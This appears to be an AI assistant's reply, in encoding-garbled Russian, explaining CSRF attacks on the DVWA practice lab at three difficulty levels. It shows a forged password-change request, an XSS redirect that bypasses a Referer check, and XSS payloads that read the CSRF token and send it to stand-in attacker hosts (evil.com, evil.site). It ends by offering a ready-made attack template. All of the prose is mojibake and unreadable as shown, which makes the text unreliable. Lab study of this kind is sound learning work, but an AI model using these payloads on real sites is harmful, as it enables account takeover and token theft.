–¢—ã –æ—Ç–ª–∏—á–Ω–æ —Ä–∞—Å–∫–ª–∞–¥—ã–≤–∞–µ—à—å –≤—Å—ë –ø–æ –ø–æ–ª–æ—á–∫–∞–º, –ê–ª–µ–∫—Å–∞–Ω–¥—Ä. –î–∞–≤–∞–π —Å–∏—Å—Ç–µ–º–Ω–æ —Ä–∞–∑–±–µ—Ä—ë–º, –∫–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç CSRF –≤ DVWA –Ω–∞ **—Ç—Ä—ë—Ö —É—Ä–æ–≤–Ω—è—Ö —Å–ª–æ–∂–Ω–æ—Å—Ç–∏**, –∫–∞–∫–∏–µ –≤–æ–∑–º–æ–∂–Ω—ã –∞—Ç–∞–∫–∏ –∏ –∫–∞–∫ –º–æ–∂–Ω–æ –ø—ã—Ç–∞—Ç—å—Å—è –æ–±–æ–π—Ç–∏ –∑–∞—â–∏—Ç—É –Ω–∞ —É—Ä–æ–≤–Ω–µ `High`, –≤–∫–ª—é—á–∞—è –≤–æ–ø—Ä–æ—Å –ø—Ä–æ —Ç–æ–∫–µ–Ω.

---

## üìò CSRF –≤ DVWA: –ü–æ–¥–º–µ–Ω–∞ –∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è

---

### üîì –£—Ä–æ–≤–µ–Ω—å **Low**

**URL:**

```
http://localhost:8081/vulnerabilities/csrf/?password_new=passwd&password_conf=passwd&Change=Change#
```

#### üìå –ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç?

* –°–µ—Ä–≤–µ—Ä **–Ω–µ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –∏—Å—Ç–æ—á–Ω–∏–∫** –∑–∞–ø—Ä–æ—Å–∞ (Referer, Origin).
* –ù–µ—Ç –ø—Ä–æ–≤–µ—Ä–∫–∏ `CSRF-—Ç–æ–∫–µ–Ω–∞`.
* **GET-–∑–∞–ø—Ä–æ—Å** —Å–∞–º –ø–æ —Å–µ–±–µ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–ª—è —Å–º–µ–Ω—ã –ø–∞—Ä–æ–ª—è.

#### üõ†Ô∏è –í–∞—Ä–∏–∞–Ω—Ç—ã –∞—Ç–∞–∫–∏:

* –°—Å—ã–ª–∫–∞ –≤ –ø–∏—Å—å–º–µ, –≤ img-—Ç–µ–≥–µ, iframe, JS.
* `<img src="...">` —Å–ø–æ–∫–æ–π–Ω–æ –æ—Ç—Ä–∞–±–æ—Ç–∞–µ—Ç, –µ—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ª–æ–≥–∏–Ω–µ–Ω.

---

### ‚ö†Ô∏è –£—Ä–æ–≤–µ–Ω—å **Medium**

**–û—Ç–ª–∏—á–∏–µ**:

* –î–æ–±–∞–≤–ª–µ–Ω–∞ –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ **Referer** ‚Äî –æ–Ω –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –æ—Ç `localhost`.

#### üìå –ö–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç –∑–∞—â–∏—Ç–∞?

```php
if (strpos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) === false) {
    die("CSRF detected");
}
```

#### ‚úÖ –ö–∞–∫ –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏?

–¢—ã –ø—Ä–∞–≤–∏–ª—å–Ω–æ —Å–¥–µ–ª–∞–ª:

```html
<img src="123.png" onerror="location.href='http://localhost:8081/vulnerabilities/csrf/?password_new=passwd&password_conf=passwd&Change=Change#'">
```

–¢—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω **XSS** –∫–∞–∫ —Å–ø–æ—Å–æ–± **–ø–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏–∏**, —á—Ç–æ –æ–±—Ö–æ–¥–∏—Ç –ø—Ä–æ–≤–µ—Ä–∫—É Referer, –ø–æ—Ç–æ–º—É —á—Ç–æ –∏–Ω–∏—Ü–∏–∞—Ç–æ—Ä–æ–º —Ç–µ–ø–µ—Ä—å –≤—ã—Å—Ç—É–ø–∞–µ—Ç **–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å**, –∞ –Ω–µ –≤–Ω–µ—à–Ω–∏–π —Å–∞–π—Ç.

---

## üîí –£—Ä–æ–≤–µ–Ω—å **High**

–¢–µ–ø–µ—Ä—å –∑–∞—â–∏—Ç–∞ —É—Å–∏–ª–∏–ª–∞—Å—å:

* –¢—Ä–µ–±—É–µ—Ç—Å—è **CSRF-—Ç–æ–∫–µ–Ω**, —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ —Å–µ—Å—Å–∏–∏.
* –¢–æ–∫–µ–Ω –ø–µ—Ä–µ–¥–∞—ë—Ç—Å—è –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä–µ: `user_token=...`
* –ë–µ–∑ –Ω–µ–≥–æ —Å–µ—Ä–≤–µ—Ä –Ω–µ –≤—ã–ø–æ–ª–Ω–∏—Ç –∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª—è.

### üîç –ü—Ä–∏–º–µ—Ä:

```http
GET /vulnerabilities/csrf/?password_new=passwd&password_conf=passwd&Change=Change&user_token=2c5d7d725521284f98fe942ee485e846
```

---

## üß† –í–æ–∑–º–æ–∂–Ω—ã–µ –≤–µ–∫—Ç–æ—Ä—ã –æ–±—Ö–æ–¥–∞:

### ‚úÖ 1. **–ö—Ä–∞–∂–∞ —Ç–æ–∫–µ–Ω–∞ —á–µ—Ä–µ–∑ Stored XSS**

–ï—Å–ª–∏ —Ç—ã —É–∂–µ –º–æ–∂–µ—à—å –≤—Å—Ç–∞–≤–∏—Ç—å XSS ‚Äî –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å JS, –∫–æ—Ç–æ—Ä—ã–π:

* –ß–∏—Ç–∞–µ—Ç —Ç–æ–∫–µ–Ω –∏–∑ DOM (–µ—Å–ª–∏ –µ—Å—Ç—å –≤ HTML):

  ```js
  var token = document.getElementsByName("user_token")[0].value;
  ```
* –ò–ª–∏ –ø–∞—Ä—Å–∏—Ç –µ–≥–æ –∏–∑ URL/—Ñ–æ—Ä–º–∞/innerHTML
* –û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –Ω–∞ —Ç–≤–æ–π —Å–µ—Ä–≤–µ—Ä:

  ```js
  fetch("https://evil.site/csrf_token?token=" + token);
  ```

–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ, —Ç—ã **–Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –∞—Ç–∞–∫—É—é—â–µ–≥–æ**:

* –î–µ–ª–∞–µ—à—å —Å—Å—ã–ª–∫—É —Å –∞–∫—Ç—É–∞–ª—å–Ω—ã–º —Ç–æ–∫–µ–Ω–æ–º
* –ñ–µ—Ä—Ç–≤–∞ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç ‚Äî –∏ –≤—Å—ë —Å—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç.

---

### üîê –í–æ–ø—Ä–æ—Å: –º–æ–∂–Ω–æ –ª–∏ **—É–≥–∞–¥–∞—Ç—å** –∏–ª–∏ –ø–æ–¥—Å—Ç–∞–≤–∏—Ç—å **–ª—é–±–æ–π —Ç–æ–∫–µ–Ω**?

**–û—Ç–≤–µ—Ç: –ù–µ—Ç**, –µ—Å–ª–∏ –∑–∞—â–∏—Ç–∞ —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ.

#### –ü–æ—á–µ–º—É:

* **–¢–æ–∫–µ–Ω—ã –≥–µ–Ω–µ—Ä–∏—Ä—É—é—Ç—Å—è —Å–ª—É—á–∞–π–Ω–æ**, –æ–±—ã—á–Ω–æ –ø–æ `md5(rand())`, `openssl_random_pseudo_bytes()` –∏–ª–∏ `random_bytes()`
* **–û–Ω–∏ —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ —Å–µ—Å—Å–∏–∏**: –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ —Ç–æ–∫–µ–Ω–∞ –≤ –∑–∞–ø—Ä–æ—Å–µ ‚Äî —Å–µ—Ä–≤–µ—Ä —Å–≤–µ—Ä—è–µ—Ç –µ–≥–æ —Å —Ö—Ä–∞–Ω–∏–º—ã–º –∑–Ω–∞—á–µ–Ω–∏–µ–º, –∏ –µ—Å–ª–∏ **–Ω–µ —Å–æ–≤–ø–∞–¥–∞–µ—Ç ‚Äî –æ—Ç–∫–ª–æ–Ω—è–µ—Ç** –∑–∞–ø—Ä–æ—Å.

```php
if ($_GET['user_token'] !== $_SESSION['user_token']) {
    die("CSRF detected");
}
```

‚û°Ô∏è **–ù–µ–ª—å–∑—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —á—É–∂–æ–π —Ç–æ–∫–µ–Ω** ‚Äî –¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω –æ—Ç –¥—Ä—É–≥–æ–π —Å–µ—Å—Å–∏–∏ –∏–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

---

## üß™ –ú–æ–∂–Ω–æ –ª–∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å/–ø–æ–¥—Å—Ç–∞–≤–∏—Ç—å —Ç–æ–∫–µ–Ω?

**–ï—Å–ª–∏ —Ç–æ–∫–µ–Ω –ø—Ä–æ—Å—Ç–æ –ø–æ–¥—Å—Ç–∞–≤–∏—Ç—å –±–µ–∑ –∑–Ω–∞–Ω–∏—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è ‚Äî –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç.**

**–ó–∞—à–∏—Ñ—Ä–æ–≤–∞—Ç—å** –µ–≥–æ —Ç–æ–∂–µ –Ω–µ—Ç —Å–º—ã—Å–ª–∞, —Ç.–∫. —Å–µ—Ä–≤–µ—Ä –Ω–µ –¥–µ–∫–æ–¥–∏—Ä—É–µ—Ç/—Ä–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ—Ç —Ç–æ–∫–µ–Ω ‚Äî –æ–Ω —Å—Ä–∞–≤–Ω–∏–≤–∞–µ—Ç —Å–µ—Å—Å–∏–∏ –Ω–∞–ø—Ä—è–º—É—é (–≤ –≤–∏–¥–µ —Å—Ç—Ä–æ–∫–∏).

---

## üìå –†–µ–∑—é–º–µ –ø–æ –∞—Ç–∞–∫–∞–º –∏ –∑–∞—â–∏—Ç–µ:

| –£—Ä–æ–≤–µ–Ω—å | –ó–∞—â–∏—Ç–∞           | –ö–∞–∫ –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏                     |
| ------- | ---------------- | ------------------------------------ |
| Low     | –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç      | –ü—Ä–æ—Å—Ç–æ –ø–æ–¥—Å—Ç–∞–≤–∏—Ç—å GET-–∑–∞–ø—Ä–æ—Å         |
| Medium  | –ü—Ä–æ–≤–µ—Ä–∫–∞ Referer | –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å XSS –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è |
| High    | CSRF-—Ç–æ–∫–µ–Ω       | –ù—É–∂–Ω–æ —É–∫—Ä–∞—Å—Ç—å —Ç–æ–∫–µ–Ω —Å –ø–æ–º–æ—â—å—é XSS    |

---

## üß∞ –¢–≤–æ—ë —É–ª—É—á—à–µ–Ω–∏–µ Stored XSS –¥–ª—è –∫—Ä–∞–∂–∏ —Ç–æ–∫–µ–Ω–∞

–ï—Å–ª–∏ —Ñ–æ—Ä–º–∞ —Å–æ–¥–µ—Ä–∂–∏—Ç:

```html
<input type="hidden" name="user_token" value="...">
```

—Ç–æ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:

```html
<img src="x" onerror="
fetch('https://evil.com/?c=' + document.getElementsByName('user_token')[0].value)
">
```

–∏–ª–∏ —Ç–∏—Ö–æ:

```html
<script>
new Image().src = 'https://evil.com/c=' + document.getElementsByName('user_token')[0].value;
</script>
```

---

–ï—Å–ª–∏ —Ö–æ—á–µ—à—å, –º–æ–≥—É —Å–æ–±—Ä–∞—Ç—å –¥–ª—è —Ç–µ–±—è:

* üß™ –ì–æ—Ç–æ–≤—ã–π —à–∞–±–ª–æ–Ω –∞—Ç–∞–∫–∏ –Ω–∞ high —É—Ä–æ–≤–µ–Ω—å —Å –ø–æ—Ö–∏—â–µ–Ω–∏–µ–º —Ç–æ–∫–µ–Ω–∞
* üõ°Ô∏è –û–±—Ä–∞—Ç–Ω—ã–π —à–∞–±–ª–æ–Ω –∑–∞—â–∏—Ç—ã –Ω–∞ PHP
* ‚úÖ –ß–µ–∫–ª–∏—Å—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —Å–º–µ–Ω—ã –ø–∞—Ä–æ–ª—è

–ü—Ä–æ–¥–æ–ª–∂–∏–º?
